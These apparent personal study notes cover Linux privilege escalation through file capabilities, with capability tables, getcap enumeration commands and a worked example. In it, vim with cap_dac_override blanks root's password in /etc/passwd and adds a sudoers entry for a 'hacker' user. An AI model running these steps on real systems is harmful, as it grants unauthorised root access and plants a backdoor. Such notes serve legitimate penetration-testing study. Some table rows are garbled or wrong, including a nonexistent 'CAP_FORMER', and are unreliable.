[https://steflan-security.com/linux-privilege-escalation-exploiting-capabilities/](https://steflan-security.com/linux-privilege-escalation-exploiting-capabilities/)

[https://book.hacktricks.xyz/linux-hardening/privilege-escalation/linux-capabilities](https://book.hacktricks.xyz/linux-hardening/privilege-escalation/linux-capabilities)

Restrict a binary to only certain actions using setcap

```bash
sudo setcap cap_net_bind_service=+ep /usr/bin/vim.basic
```

|**Capability**|**Desciption**|
|---|---|
|`cap_sys_admin`|Allows to perform actions with administrative privileges, such as modifying system files or changing system settings.|
|`cap_sys_chroot`|Allows to change the root directory for the current process,|
|allowing it to access files and directories that would otherwise be||
|inaccessible.||
|`cap_sys_ptrace`|Allows to attach to and debug other processes, potentially allowing|
|it to gain access to sensitive information or modify the behavior of||
|other processes.||
|`cap_sys_nice`|Allows to raise or lower the priority of processes, potentially|
|allowing it to gain access to resources that would otherwise be||
|restricted.||
|`cap_sys_time`|Allows to modify the system clock, potentially allowing it to|
|manipulate timestamps or cause other processes to behave in unexpected||
|ways.||
|`cap_sys_resource`|Allows to modify system resource limits, such as the maximum number|
|of open file descriptors or the maximum amount of memory that can be||
|allocated.||
|`cap_sys_module`|Allows to load and unload kernel modules, potentially allowing it to|
|modify the operating system's behavior or gain access to sensitive||
|information.||
|`cap_net_bind_service`|Allows to bind to network ports, potentially allowing it to gain|
|access to sensitive information or perform unauthorized actions.||

|**Capability Values**|**Desciption**|
|---|---|
|`=`|This value sets the specified capability for the executable, but|
|does not grant any privileges. This can be useful if we want to clear a||
|previously set capability for the executable.||
|`+ep`|This value grants the effective and permitted privileges for the|
|specified capability to the executable. This allows the executable to||
|perform the actions that the capability allows but does not allow it to||
|perform any actions that are not allowed by the capability.||
|`+ei`|This value grants sufficient and inheritable privileges for the|
|specified capability to the executable. This allows the executable to||
|perform the actions that the capability allows and child processes||
|spawned by the executable to inherit the capability and perform the same||
|actions.||
|`+p`|This value grants the permitted privileges for the specified|
|capability to the executable. This allows the executable to perform the||
|actions that the capability allows but does not allow it to perform any||
|actions that are not allowed by the capability. This can be useful if we||
|want to grant the capability to the executable but prevent it from||
|inheriting the capability or allowing child processes to inherit it.||
|||

Several Linux capabilities can be used to escalate a user's privileges to `root`, including:

|**Capability**|**Desciption**|
|---|---|
|`CAP_SETUID`|Allows a process to set its effective user ID, which can be used to gain the privileges of another user, including the `root` user.|
|`CAP_SETGID`|Allows to set its effective group ID, which can be used to gain the privileges of another group, including the `root` group.|
|`CAP_SYS_ADMIN`|This capability provides a broad range of administrative privileges,|
|including the ability to perform many actions reserved for the `root` user, such as modifying system settings and mounting and unmounting file systems.||

The following capabilities are particularly dangerous and should be investigated further if found enabled on a system:

- CAP_CHOWN
- CAP_DAC_OVERRIDE
- CAP_DAC_READ_SEARCH
- CAP_SETUID
- CAP_SETGID
- CAP_NET_RAW
- CAP_SYS_ADMIN
- CAP_SYS_PTRACE
- CAP_SYS_MODULE
- CAP_FORMER
- CAP_SETFCAP

Find setcap capabilities

```bash
find /usr/bin /usr/sbin /usr/local/bin /usr/local/sbin -type f -exec getcap {} \\;
getcap -r / 2>/dev/null
```

Have access to an account but no access to cap_sys_admin?

```bash
getcap /usr/bin/vim.basic
```

VIM can run as admin and edit files

```bash
/usr/bin/vim.basic /etc/passwd
```

```bash
echo -e ':%s/^root:[^:]*:/root::/\\nwq' | /usr/bin/vim.basic -es /etc/passwd
```

```bash
cat /etc/passwd | head -n1
root::0:0:root:/root:/bin/bash
```

VIM has the capability: cap_dac_override+eip

```bash
/usr/bin/vim.basic = cap_dac_override+eip
```

You can write to ANY file bypassing privs

```bash
vim /etc/sudoers
```

add your user

```bash
hacker	ALL=(ALL:ALL) ALL
```

Now you can run sudo

```python
getcap -r / 2>/dev/null
```